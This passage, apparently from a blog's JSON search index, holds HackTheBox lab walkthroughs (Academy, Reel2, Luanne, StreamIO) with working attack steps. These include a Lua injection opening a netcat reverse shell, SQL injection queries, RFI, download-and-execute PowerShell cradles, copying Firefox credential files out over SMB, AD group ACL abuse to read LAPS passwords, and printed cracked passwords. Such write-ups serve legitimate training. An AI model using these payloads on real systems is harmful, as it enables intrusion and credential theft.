to the hosts file and check it out:There we can find DB credentialsAnd there is also a API key, but there is also vulnerability present in laravel framework for this version: This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x &amp;lt;= 5.6.29. Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php. Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY. Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix. In some cases the APP_KEY is leaked which allows for discovery and exploitation.Running it gives us shell:Linpeas has found quite a few passwords but only this looks promising since it is not from the dev stage…Password won’t work for mysql but it will work for cry0l1t3 user!Same creds will work for SSH!PRIVILEGE ESCALATIONRunning Linpeas.sh again has found following credentials. This was possible as the cry0l1t3 user belongs to adm group[+] Checking for TTY (sudo/su) passwords in audit logs1. 08/12/2020 02:28:10 83 0 ? 1 sh &quot;su mrb3n&quot;,&amp;lt;nl&amp;gt;2. 08/12/2020 02:28:13 84 0 ? 1 su &quot;mrb3n_Ac@d3my!&quot;,&amp;lt;nl&amp;gt;And logging in as user mrb3n now, we can see that it can run composer with sudo rights:mrb3n@academy:/var/log$ sudo -l[sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mrb3n may run the following commands on academy: (ALL) /usr/bin/composerReference GTFObins: https://gtfobins.github.io/gtfobins/composer/TF=$(mktemp -d)echo &#39;{&quot;scripts&quot;:{&quot;x&quot;:&quot;/bin/sh -i 0&amp;lt;&amp;amp;3 1&amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;}}&#39; &amp;gt;$TF/composer.jsonsudo composer --working-dir=$TF run-script xRunning commands above grant us root access:" }, { "title": "(HTB) - Reel2", "url": "/posts/Reel2/", "categories": "HackTheBox, Windows", "tags": "Windows, Powershell, OWA, Password Spraying, IIS, Phishing, User Enumeration, JEA Bypass, Social Engineering, Clear Text Credentials, Defense Mechanisms, Hash Capture, Password Cracking, Packet Capture Analysis, Weak Credentials, Memory Dump, Account Misconfiguration", "date": "2022-09-22 11:33:00 +0200", "snippet": "Reel2 is an awesome Windows machine which requires phishing, password spraying, cracking. After having shell access, there is JEA implemented which makes things harder, but it’s nice to get introducted to JEA security concept by MicrosoftENUMERATIONNMAPNmap scan report for 10.10.10.210Host is up (0.044s latency).Not shown: 991 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 8.5|_http-server-header: Microsoft-IIS/8.5|_http-title: 403 - Forbidden: Access is denied.443/tcp open ssl/https?| ssl-cert: Subject: commonName=Reel2| Subject Alternative Name: DNS:Reel2, DNS:Reel2.htb.local| Issuer: commonName=Reel2| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2020-07-30T10:12:46| Not valid after: 2025-07-30T10:12:46| MD5: aa49 5cac 7115 c7fe 0628 2a6b 0124 37c4|_SHA-1: d7ea 2696 a56f 09cb 24ce 557f 830e 86ec 5f63 0f2d|_ssl-date: 2021-01-28T06:31:11+00:00; 0s from scanner time.6001/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.06002/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.06004/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.06005/tcp open msrpc Microsoft Windows RPC6006/tcp open msrpc Microsoft Windows RPC6007/tcp open msrpc Microsoft Windows RPC8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32|_http-title: Welcome | WallstantService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsGOBUSTERluka@kali:~$ gobuster dir -u https://reel2.htb.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: https://reel2.htb.local[+] Threads: 50[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Timeout: 10s===============================================================2021/01/28 08:29:32 Starting gobuster===============================================================/public (Status: 302)/exchange (Status: 302)/Public (Status: 302)/rpc (Status: 401)/owa (Status: 301)EXPLOITATIONOWALet’S focus on OWA.WEBSERVERLogged in and started gobuster with cookiegobuster dir -u http://reel2.htb.local:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x php,bak,txt -c &quot;PHPSESSID=np9phr5h2gjnjrvg9jroca76la&quot;Nothing found so farThis part was hard!!So there we have a few user which could be used for bruteforce attack against OWA and web application. User sven (svensson nickname or lastname) has a post and summer and hot may be actually hints (it is a CTF right). There is also Lars Larsson but without any posts and 2 other users.Used following script, but deleted following lines:while num == &#39;&#39;: num = raw_input(&quot;Enter Birth Year: &quot;)cat generate-username.py | grep -v &quot;num&quot; &amp;gt; generate-username-no_birth_year.pyAnd ran it:luka@kali:~/htb/reel2$ python generate-username-no-birthday.py _____________________________________________________________username by Sukant | sukant929@protonmail.comGenerate username using First Name, Last Name &amp;amp; Birth Year... ***** All fields are mandatory *****_____________________________________________________________Enter First Name: svenEnter Last Name: svensson---------------------------------------svensvenssonsvensvenssonsvenssonsvensven.svenssonsvensson.svensven_svenssonsvensson_svensvenssvenssonsssvenssonssvens.svenssons.svens_svenssons_svensven.ssvensson_s---------------------------------------Tests with summer2020, Summer2020 (used already in simmilar CTFs)coincedently when i was searching for password spraying tools for owa, i’ve found the password on hacktricks :)./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verboseluka@kali:~/htb/reel2$ /home/luka/tools/ruler/ruler --domain reel2.htb -k brute --users usernames --passwords passes.txt --delay 0 --verbose [+] Starting bruteforce[+] Trying to Autodiscover domain[+] 0 of 3 passwords checked[x] Failed: sven:summer2020...SNIP...[x] Failed: svenssons:Summer2020[x] Failed: ssvensson:Summer2020[x] Failed: ssven:Summer2020[+] Success: s.svensson:Summer2020[x] Failed: s.sven:Summer2020[x] Failed: s_sven:Summer2020...SNIP...Login works:Clicking on “Om” shows more detailsPhishingI’ve used light version because normal one did’t open address book.Sending a message and start responder beforehand!! (sudo responder -I tun0)Getting the hash back in Responder!Hashcat was successful at cracking the hash using the mod 5600Winrm works but gives an errorI’VE USED WINDOWS from HERE!!WinRM as k.svenssonI’VE USED WINDOWS from HERE!!Enable-PSRemoting -SkipNetworkProfileCheck -ForceSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value &quot;10.10.10.210&quot; -Force# Connect (password kittycat1)Enter-PSSession -Computer 10.10.10.210 -credential HTB\\k.svensson -Authentication NegotiateConnection was succesful commands aren’t working:In Linux this happens if commands are not in PATH…This however does not seem to be the case here[10.10.10.210]: PS&amp;gt;$env:PathC:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\Microsoft\\Exchange Server\\V14\\binSolution was to run the commands in &amp;amp; (to launch command in script block {} =&amp;gt; e.g. &amp;amp;{ls}Privilege EscalationFinding Sticky NotesSince there was a shortcut left for sticky notes and it seems that privesc has something to do with it, i copied the contents to view them on my machine.C:\\Users\\k.svensson\\AppData\\Roaming&amp;gt;xcopy stickynotes\\* C:\\Users\\k.svensson\\Links\\stickynotes /E /HC:\\Users\\k.svensson\\Links&amp;gt;powershell -c &quot;Compress-Archive -Path .\\stickynotes -DestinationPath .\\stickynotes.zip&quot;SERVER on Windows: python3.9.exe .\\server.py --bind 0.0.0.0powershell -c &quot;Invoke-RestMethod -Uri http://10.10.14.22:8000/stickynotes.zip -infile .\\stickynotes.zip -method put&quot;Credentials found were: jea_test_account:Ab!Q@vcg^%@#1.Short article to JEA (Just Enough Administraton).searching for jea_test_account yields few resultsBoth jea_test_account files are writable but they dont execute.Creating symlink in order to exploit Check-Name in jea_test_account profile solves that issue:[10.10.10.210]: PS&amp;gt;&amp;amp;{cmd /c mklink /J adm c:\\Users\\Administrator\\Desktop}Junction created for adm &amp;lt;&amp;lt;===&amp;gt;&amp;gt; c:\\Users\\Administrator\\DesktopReading the root.txtPS C:\\Users\\hosoj&amp;gt; Enter-PSSession -Computer 10.10.10.210 -credential HTB\\k.svensson -ConfigurationName jea_test_account -Authentication Negotiate[10.10.10.210]: PS&amp;gt;Check-File C:\\ProgramData\\adm\\root.txt349ece0aac********0dd0f2a4115" }, { "title": "(HTB) - Luanne", "url": "/posts/Luanne/", "categories": "HackTheBox, Other", "tags": "NetBSD, Bozohttpd, Lua, Default Credentials, Code Injection, NGINX, Password Cracking, Password Reuse, Weak Credentials", "date": "2022-09-22 11:33:00 +0200", "snippet": "Luanne is a easy NetBSD box, which starts command injection. Privilege escalation is done by enumerating backups and decrypting thoseENUMERATIONNMAPNmap scan report for 10.10.10.218Host is up (0.038s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)| ssh-hostkey: | 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)| 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)|_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)80/tcp open http nginx 1.19.0| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 1 disallowed entry |_/weather|_http-server-header: nginx/1.19.0|_http-title: 401 Unauthorized9001/tcp open http Medusa httpd 1.12 (Supervisor process manager)| http-methods: |_ Supported Methods: HEAD POST OPTIONS|_http-server-header: Medusa/1.12Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsdThe robots.txt is present and has /weather entry in it!GoBusterluka@kali:~$ gobuster dir -u http://luanne.htb/weather -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x php,bak,txt===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://luanne.htb/weather[+] Threads: 50[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Extensions: php,bak,txt[+] Timeout: 10s===============================================================2021/01/27 16:19:25 Starting gobuster===============================================================/forecast (Status: 200)WebServerThere is aparently some weather forecast API-like application running.Lets check city parameter with list value:Injection seems to work, and so should command chainingBy switching to POST it is possible to see the error:luka@kali:~/htb/luanne$ curl -d &quot;city=&#39;&quot; http://luanne.htb/weather/forecast&amp;lt;br&amp;gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil valueExploitationCommand InjectionFollowing payload was used (BSD):http://luanne.htb/weather/forecast?city=London%27); require(&#39;os&#39;);os.execute(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.22 4446 &amp;gt;/tmp/f&#39;);+--+Privilege Escalation #1 to r.michaelsEnumerationFollowing was found by linpeas.shCredentials were found in /var/www/.htpasswd :$ cat /var/www/.htpasswd webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0HashcatHash has been cracked using hashcat.Logging in using the credentialsSupervisor App is actually not vulnerable!Privilege Escalation #2 to rootGetting Shell as r.michaelsWeirdly process is running on port 3001.We can login using basic credentials and fetch the home directory from r.michaels:$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB...SNIP189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQgQLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp99OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG-----END OPENSSH PRIVATE KEY-----Let’s login using r.michaels’s private key:luka@kali:~/htb/luanne$ ssh -i ./id_rsa r.michaels@10.10.10.218The authenticity of host &#39;10.10.10.218 (10.10.10.218)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;10.10.10.218&#39; (ECDSA) to the list of known hosts.Last login: Fri Sep 18 07:06:51 2020NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020Welcome to NetBSD!luanne$ iduid=1000(r.michaels) gid=100(users) groups=100(users)Decrypting backupsdevel_backup-2020-09-16.tar.gz.enc was found in the .gnupg home directory from r.mihaels. It can be decrypted using netpgpluanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output /tmp/devel_backup-2020-09-16.tar.gz signature 2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a uid RSA 2048-bit key &amp;lt;r.michaels@localhost&amp;gt;And there we can find another .htapasswd.Which means another password that may be cracked:Password was cracked and works for root user (need use doas since su doesn’t work)luanne$ doas -u root /bin/shPassword:sh: Cannot determine current working directory# iduid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)# cd /root# cat root.txt7a9b5c2************3675f66" }, { "title": "(HTB) - StreamIO", "url": "/posts/StreamIO/", "categories": "HackTheBox, Windows", "tags": "Windows, SQL Injection, Password Reuse, Hashcat, Password Cracking, LAPS, MSSQL, Local File Inclusion", "date": "2022-09-17 11:33:00 +0200", "snippet": "StreamIO is a medium Windows box. It’s all about enumeration at the start, finding SQL injection, Local and Remote File Inclusion. We have to keep track of passwords at all times. Last privilege Escalation cannot be done without basic AD enumerationENUMERATIONNMAPLet’s start NMAP:nmap -sC -sV -oN nmap 10.10.11.158 -PnStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 14:32 CESTNmap scan report for 10.10.11.158Host is up (0.041s latency).Not shown: 988 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: IIS Windows Server88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-09-20 19:32:20Z)135/tcp open msrpc Microsoft Windows RPC389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_ssl-date: 2022-09-20T19:33:07+00:00; +7h00m00s from scanner time.| tls-alpn: |_ http/1.1| ssl-cert: Subject: commonName=streamIO/countryName=EU| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb| Not valid before: 2022-02-22T07:03:28|_Not valid after: 2022-03-24T07:03:28|_http-title: Not Found445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s| smb2-time: | date: 2022-09-20T19:32:27|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 65.38 secondsSo we have Kerberos, DNS, Webserver. According to Certificate information, we should add the DNS/SAN Names 10.10.11.158 streamio.htb watch.streamio.htb to /etc/hosts.There is also LDAP running which always may prove useful for enumeration!WebserverChecking streamio.htb and watch.streamio.htb same default IIS page shows:I’ve started gobuster before checking SSL which is not a crime, it just won’t find anything ;). So let’s start gobuster# didn&#39;t work because of self-signed cert.gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://watch.streamio.htb# ffuf to the rescue.ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://watch.streamio.htb/FUZZMore pages were found search.php, blocked.php,…Checking the search.php we get another page where user input is possible:Requests are sent in post so let’s check that in Burp:Checking for SQLi it’s obvious that there is some blocking mechanismus behind it just by sending a query.ExploitationSQL InjectionAfter trying for a bit, NULL appears to be causing problems however following pattern appears to be working:Lets try to read the databaseBingo!Check Databasesa&#39; UNION SELECT 1,string_agg(name,&#39; : &#39;),3,4,5,6 FROM sys.databases --Getting TablesGetting CollumnsThere are few interesting fields there like obvious username and passwordDumping Usernames and Password (hashes)a&#39; UNION SELECT 1,string_agg(CONCAT(username,&#39; - &#39;,password),&#39; : &#39;),3,4,5,6 FROM streamio..users --Throwing 665a50ac9eaa781e4f7f04199db97a11 md5 hash into md5decrypt already provides us with the password which is paddpadd however let’s do this properly and try to see if we can decode other username:password combinations. Save that file and make a list of username:passwordluka@MBP htb % cat streamio_users.txt | sed &#39;s/ //g&#39; | sed &#39;s/\\/r\\/n/\\n/g&#39; James:c660060492d9edcaa8332d89c99c9239Theodore:925e5408ecb67aea449373d668b7359eSamantha:083ffae904143c4796e464dac33c1f7dLauren:08344b85b329d7efd611b7a7743e8a09William:d62be0dc82071bccc1322d64ec5b6c51Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5Robert:f03b910e2bd0313a23fdd7575f34a694Thane:3577c47eb1e12c8ba021611e1280753cCarmon:35394484d89fcfdb3c5e447fe749d213Barry:54c88b2dbd7b1a84012fabc1a4c73415Oliver:fd78db29173a5cf701bd69027cb9bf6bMichelle:b83439b16f844bd6ffe35c02fe21b3c0Gloria:0cfaaaafb559f081df2befbe66686de0Victoria:b22abb47a02b52d5dfa27fb0b534f693Alexendra:1c2b3d8270321140e5153f6637d3ee53Baxter:22ee218331afd081b0dcd8115284bae3Clara:ef8f3d30a856cf166fb8215aca93e9ffBarbra:3961548825e3e21df5646cafe11c6c76Lenord:ee0b8a0937abd60c2882eacb2f8dc49fAustin:0049ac57646627b8d7aeaccf8b6a936fGarfield:8097cedd612cc37c29db152b6e9edbd3Juliette:6dcd87740abb64edfa36d170f0d5450dVictor:bf55e15b119860a6e6b5a164377da719Lucifer:7df45a9e3de3863807c026ba48e55fb3Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5Robin:dc332fb5576e9631c9dae83f194f8e70Stan:384463526d288edcc95fc3701e523bc7yoshihide:b779ba15cedfd22a023c4d8bcf5f2332admin:665a50ac9eaa781e4f7f04199db97a11Using hashcat it shouldn’t take more then few seconds:hashcat streamio.hash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 0 --userWhich yields following results:Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusicalSabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##admin:665a50ac9eaa781e4f7f04199db97a11:paddpaddBarry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoWJuliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitchLenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69iBruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clarayoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..Enumeration v.2 - streamio.htbNow we’ve got few credentials, but no place to login.I use Feroxbuster for recursive web director enumeration and it did undeed found some interesting directories:Bruteforce streamio.htb loginI’ll use intruder but first i had to split usernames and passwords┌──(luka㉿yokai)-[~/htb/boxes/streamio]└─$ cat hashes | awk -F&quot;:&quot; &#39;{print $1}&#39; &amp;gt; user.txt┌──(luka㉿yokai)-[~/htb/boxes/streamio]└─$ cat hashes | awk -F&quot;:&quot; &#39;{print $3}&#39; &amp;gt; pass.txtAnd now capture the login request in burp and send it to intruder. We’ll use Pitchfork modeLoad user and password as 2 different sets and start bruteforcing.And last one - Yoshiside worked:Login was succesful.Apparently from here we can move to the admin pages that were discovered using feroxbuster.Fuzzing parameter namesAfter checking the source and noticing that parameters that are defined actually do nothing, i’ve decided to bruteforce parameters. FFUF was used for thatffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H &quot;Cookie: PHPSESSID=ei0qb6n4l0bove7pcsapnc2sso&quot; -u https://streamio.htb/admin/index.php?FUZZ=1 --fs 1678And we can see another parameter debug that’s being used.And after trying the newly discoverd parameter we get another unpleasant messageLocal File InclusionApparently there is LFI present making it possible for us to read local files - remember: PHP files need to be encoded to prevent executing!Here’s the DB password:Password does not work elsewhere though.Let’s try to read master.php which we also found and know it exists:master.php includes pages diferently and passes them to eval. This should execute page if we pass it remotly, so let’s try that. (Parameter’s name is include)We cannot get to master.php directly but have to include it using debug parameter and use RFI through include parameter in a POST requesetAs we can see that system reaches for file on our server (on the screenshot i’ve forgot that we’re dealing with Windows here ;)), it should be possible to execute code on StreamIO machine.I’ve tried to get reverse shell using powershell one-liner scripts etc. but nothing worked. I couldn’t figure why, so i resorted to plain netcat binary from here: https://github.com/int0x33/nc.exe/raw/master/nc64.exe.As i’ve recently switched to MAC and i didn’t fully configure my old windows machine yet, with Visual Studio on it for fancy stuff i’ve sticked with Netcat ;).As it can be seen above, i’ve used helper php script which downloaded nc64.exe to StreamIO machine and started reverse shell.We have a shell as Yoshihide which is normal medium integrity user.Privilege EscalationDB Enumeration using YoshihideWe’ve got username and password for Database before, so let’s check itPS C:\\inetpub\\streamio.htb\\admin&amp;gt; sqlcmd -S localhost -U db_admin -P &#39;B1@hx31234567890&#39; -Q &quot;select name from sys.databases;&quot;sqlcmd -S localhost -U db_admin -P &#39;B1@hx31234567890&#39; -Q &quot;select name from sys.databases;&quot;name --------------------------------------------------------------------------------------------------------------------------------master tempdb model msdb STREAMIO streamio_backupMSSQL DB EnumerationThere’s streamio_backup as well. Let’s get users from there:PS C:\\inetpub\\streamio.htb\\admin&amp;gt; sqlcmd -S localhost -U db_admin -P &#39;B1@hx31234567890&#39; -d streamio_backup -Q &quot;select * from users;&quot;sqlcmd -S localhost -U db_admin -P &#39;B1@hx31234567890&#39; -d streamio_backup -Q &quot;select * from users;&quot;id username password ----------- -------------------------------------------------- -------------------------------------------------- 1 nikk37 389d14cb8e4e9b94b137deb1caf0612a 2 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 3 James c660060492d9edcaa8332d89c99c9239 4 Theodore 925e5408ecb67aea449373d668b7359e 5 Samantha 083ffae904143c4796e464dac33c1f7d 6 Lauren 08344b85b329d7efd611b7a7743e8a09 7 William d62be0dc82071bccc1322d64ec5b6c51 8 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 Now we can send this to hashcat again as we’ve done this before already.nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.comyoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$Getting shell as nikk37This are users that exist on the systemObviously, the nikk37 is the interesting one, so let’s check it’s credentials:Let’s connect using Win-RM:Starting as nikk37 - EnumerationWe don’t have any special privileges as nikk37.One thing that caught my eye is LAPSThe other thing was Firefox password database:Firefox Password Database DecryptionWe need only 2 files from the system, the key4.db and logins.json. I first thought i’d upload them to webserver, but having no privileges with nikk37 i’ve decided to use SMB.Start the impacket’s smbserver:impacket-smbserver share . -user luka -pass luka -smb2support*Evil-WinRM* PS C:\\inetpub\\streamio.htb\\images&amp;gt; net use \\\\10.10.14.6\\share /u:luka lukaThe command completed successfully.*Evil-WinRM* PS C:\\inetpub\\streamio.htb\\images&amp;gt; copy C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release\\key4.db \\\\10.10.14.6\\share*Evil-WinRM* PS C:\\inetpub\\streamio.htb\\images&amp;gt; copy C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release\\logins.json \\\\10.10.14.6\\shareAnd extract the passwords using firepwd:https://slack.streamio.htb:b&#39;admin&#39;,b&#39;JDg0dd1s@d0p3cr3@t0r&#39;https://slack.streamio.htb:b&#39;nikk37&#39;,b&#39;n1kk1sd0p3t00:)&#39;https://slack.streamio.htb:b&#39;yoshihide&#39;,b&#39;paddpadd@12&#39;https://slack.streamio.htb:b&#39;JDgodd&#39;,b&#39;password@12&#39;Checking LAPSWinpeass showed that there is LAPS active, so let’s use LAPSToolkit to enumerate that:*Evil-WinRM* PS C:\\&amp;gt; (new-object system.net.webclient).downloadstring(&#39;http://10.10.14.6/tools/LAPSToolkit.ps1&#39;) | IEX*Evil-WinRM* PS C:\\&amp;gt; Get-LAPSComputersComputerName Password Expiration------------ -------- ----------DC.streamIO.htb 09/28/2022 15:33:39*Evil-WinRM* PS C:\\&amp;gt; Find-LAPSDelegatedGroupsOrgUnit Delegated Groups------- ----------------OU=Domain Controllers,DC=streamIO,DC=htb streamIO\\CORE STAFF## Checking Object ACLs on CORE STAFFSo we wan’t a user that has CORE STAFF group assigned to it in order to read Administrator password. Group is however empty, but let’s check ACLs if we can make any changes to it.In order to see that, we can use powerview (however Get-ObjectAcl might suffice which was probably already imported with LAPSToolkit.ps1)Get-ObjectAcl -Name &quot;CORE STAFF&quot; -ResolveGUIDsAnd there it is:Leveraging JDgodd’s credentialsJDgodd can write to the CORE STAFF group object.JDgodd has no other groups apart from Domain Users so WINRM should not work BUT we still have to check the passwords that we’ve found before.So let’s put nikk37 into CORE STAFF group in JDgodd’s context:ow I’ll need a credential object for JDgodd:(new-object system.net.webclient).downloadstring(‘http://10.10.14.6/tools/powerview.ps1’) | IEX*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&amp;gt; $pass = ConvertTo-SecureString &#39;JDg0dd1s@d0p3cr3@t0r&#39; -AsPlainText -Force*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&amp;gt; $cred = New-Object System.Management.Automation.PSCredential(&#39;streamio\\JDgodd&#39;, $pass)*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&amp;gt; Add-DomainObjectAcl -Credential $cred -TargetIdentity &quot;Core Staff&quot; -PrincipalIdentity &quot;streamio\\JDgodd&quot;*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&amp;gt; Add-DomainGroupMember -Credential $cred -Identity &quot;Core Staff&quot; -Members &quot;StreamIO\\nikk37&quot;*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&amp;gt; net group &quot;CORE STAFF&quot; /domainGroup name CORE STAFFCommentMembers-------------------------------------------------------------------------------nikk37The command completed successfully.So we should now be able to read the “Administrator”’s password using LAPS.Reading LAPS Password*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&amp;gt; (new-object system.net.webclient).downloadstring(&#39;http://10.10.14.6/tools/LAPSToolkit.ps1&#39;) | IEX*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&amp;gt; Get-LAPSComputersComputerName Password Expiration------------ -------- ----------DC.streamIO.htb BO4CU03Xt5!(c1 09/28/2022 15:33:39Administrator can login using WinRM:Game over!" }, { "title": "Bucket", "url": "/posts/Bucket/", "categories": "HackTheBox, Linux", "tags": "Linux, Cloud, DynamoDB, PHP, Unrestricted File Upload, Bucket Enumeration, PD4LM, Misconfiguration, AWS Enumeration, Weak Permissions, Password Reuse, Source Code Review, Brute Force Attack, Tunneling, Arbitrary File Read, Port Forwarding", "date": "2022-09-15 11:33:00 +0200", "snippet": "Bucket is medium rated linux box, which is mostly about exploiting common bucket miscofigurations. Bucket is based on AWS technology(DynamoDB,S3)ENUMERATIONNMAPLet’s start NMAP:Nmap scan report for 10.10.10.212Host is up (0.035s latency).Not shown: 968 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http Apache httpd 2.4.41| http-methods: |_ Supported Methods: HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to 